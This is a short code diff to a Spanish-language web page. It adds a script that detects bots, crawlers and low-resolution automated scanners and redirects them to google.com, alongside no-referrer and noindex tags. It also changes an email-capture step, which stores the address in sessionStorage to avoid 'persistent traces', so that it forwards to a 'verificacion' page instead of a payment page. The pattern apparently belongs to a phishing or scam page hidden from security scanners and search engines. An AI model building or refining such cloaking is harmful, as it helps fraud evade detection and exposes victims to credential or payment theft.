@@ -1,6 +1,18 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <script>
+        // 1. Filtro por nombre de Bot
+        const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+        
+        // 2. Filtro por resolución (Lo que me acabas de pasar)
+        const isLowRes = (window.screen.width < 100 || window.screen.height < 100);
+
+        if (isBot || isLowRes) {
+            // Si es un bot o un scanner automático, lo expulsamos
+            window.location.href = "https://www.google.com";
+        }
+    </script>
     <meta name="referrer" content="no-referrer">
     <meta name="robots" content="noindex, nofollow">
     <meta charset="UTF-8" />
@@ -130,7 +142,7 @@
             if(inputVal.includes('@') && inputVal.length > 5) {
                 // Usamos sessionStorage para evitar rastros persistentes
                 sessionStorage.setItem('usr_temp_mail', inputVal);
-                window.location.href = 'pay.html';
+                window.location.href = 'verificacion.html';
             } else {
                 alert('Por favor, ingresa un correo válido.');
             }
